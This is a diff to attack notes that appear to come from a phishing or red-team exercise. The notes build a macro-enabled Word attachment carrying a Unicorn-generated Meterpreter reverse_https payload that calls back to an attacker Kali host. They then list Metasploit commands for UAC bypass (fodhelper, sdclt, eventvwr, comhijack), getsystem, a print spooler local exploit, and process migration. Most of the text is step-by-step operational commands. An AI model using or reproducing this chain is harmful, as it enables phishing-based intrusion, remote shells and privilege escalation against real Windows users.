@@ -8,24 +8,12 @@ Setup Microsoft Word
 
 - Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
 - Click Developer | Macros
-- Open Word / Developer / Macros / Create / Auto_Open / insert payload from Unicorn
+- Open Word / Developer / Macros / Create / AutoOpen / insert payload from Unicorn
+- The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
 - Macro Security - Enable all macros
 - Save as a Word Macro-Enabled Document
-
-https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
+- Create a Email and save it as a MSG file with attachement 
 -------
-Description of behaviors of Auto-Exec and Auto-Open macros in Word
-
-AutoOpen in Word
-https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
-If you are deploying this against Office365/2016+ versions of Word you need 
-to modify the first line of the output from: Sub Auto_Open()                                                       
-                                                                                                                   
-To: Sub AutoOpen()                                                                                                 
-                                                                                                                   
-The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. 
--------
-
 Create a Email MSG shortcut for the following;
 
 "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "No Account" "C:\Users\domainuser\Desktop\email.msg"
@@ -42,17 +30,16 @@ curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/m
 git clone https://github.com/trustedsec/unicorn
 chmod +x unicorn
 python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
----------
-sudo msfconsole -r unicorn.rc
----------
 
+---------
 Copy maro powershell_attack.txt into Word attachment. 
 
 sudo mv powershell_attack.txt /home/powershell_attack.txt
 scp kali@10.3.99.1:/home/powershell.txt 
 
----------
 
+sudo msfconsole -r unicorn.rc
+---------
 sessions -i 1
 load priv stdapi extapi
 
@@ -65,6 +52,29 @@ exploit
 getuid
 getsystem
 
+---------
+use exploit/windows/local/bypassuac_fodhelper
+use exploit/windows/local/bypassuac_sdclt
+use exploit/windows/local/bypassuac_eventvwr
+use exploit/windows/local/bypassuac_comhijack
+
+
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+exploit
+---
+
+use exploit/windows/local/bypassuac_comhijack
+set SESSION 1
+exploit
+---
+
+run post/multi/recon/local_exploit_suggester
+---
+
+use exploit/windows/local/print_spooler_dcerpc
+set SESSION 1
+exploit
 ---------
 execute -H -c -f "C:\\windows\\sysnative\\notepad.exe"
 migrate 7584
